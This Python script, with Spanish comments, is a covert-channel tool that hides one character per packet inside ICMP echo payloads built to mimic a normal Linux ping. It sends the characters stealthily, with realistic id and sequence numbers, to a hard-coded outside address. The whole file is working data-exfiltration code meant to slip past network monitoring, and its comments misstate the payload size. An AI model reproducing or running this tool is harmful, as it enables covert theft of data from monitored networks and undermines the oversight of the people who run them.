import sys
import time
import os
import struct
from scapy.all import IP, ICMP, send

# =======================================================
# CONFIGURACIÓN
IP_DESTINO_FIJA = "8.8.8.8"  # 
# =======================================================

def crear_payload_estandar(caracter_oculto):
  """
  Crea un payload de 56 bytes que imita a un ping de Linux.
  Oculta el caracter en el noveno byte, justo después del timestamp.
  """
  # 1. Primeros 8 bytes: Timestamp (tiempo actual en formato 'long long')
  # struct.pack empaqueta el valor en bytes. 'Q' es para un unsigned long long (8 bytes).
  timestamp = struct.pack('Q', int(time.time() * 1000000))

  # 2. El resto del payload (48 bytes)
  # Creamos un patrón de datos estándar (bytes del 8 al 55)
  patron_datos = b"abcdefghijklmnopqrstuvwabcdefghi"
  # En total, 8 (timestamp) + 48 (datos) = 56 bytes de payload

  # 3. Ocultamos nuestro caracter
  # Convertimos el caracter a su valor numérico (ASCII)
  byte_oculto = caracter_oculto.encode('utf-8')
  
  # Reconstruimos el payload: timestamp + nuestro byte + el resto del patrón
  payload_final = timestamp + byte_oculto + patron_datos[1:] # Se omite el primer byte del patrón original
  
  return payload_final

def enviar_por_icmp_sigiloso(destino, datos_cifrados, demora=1):
  """
  Envía datos de forma sigilosa imitando un ping real.
  """
  print(f"[*] Iniciando envío sigiloso de {len(datos_cifrados)} caracteres a {destino}.")

  # Usamos el ID del proceso actual para el ICMP ID, como haría un ping real.
  # El '& 0xFFFF' asegura que sea un valor de 16 bits.
  icmp_id = os.getpid() & 0xFFFF
  icmp_seq = 1 # El número de secuencia empieza en 1

  for caracter in datos_cifrados:
    # 1. Crear un payload que parezca legítimo pero que contenga nuestro dato
    payload = crear_payload_estandar(caracter)
    
    # 2. Construir el paquete, esta vez especificando id y seq
    paquete = IP(dst=destino) / ICMP(id=icmp_id, seq=icmp_seq) / payload
    
    send(paquete, verbose=0)
    
    print(f"  [+] Paquete enviado (seq={icmp_seq}, char='{caracter}')")
    
    # 3. Incrementar el número de secuencia para el siguiente paquete
    icmp_seq += 1
    
    time.sleep(demora)
    
  print(f"\n[*] Envío completado.")

if __name__ == "__main__":
  if len(sys.argv) != 2:
    print("Formato de uso: sudo python3 icmp.py \"<texto_cifrado>\"")
    print(f"La IP de destino configurada internamente es: {IP_DESTINO_FIJA}")
    sys.exit(1)
    
  texto_a_enviar = sys.argv[1]
  
  enviar_por_icmp_sigiloso(IP_DESTINO_FIJA, texto_a_enviar)
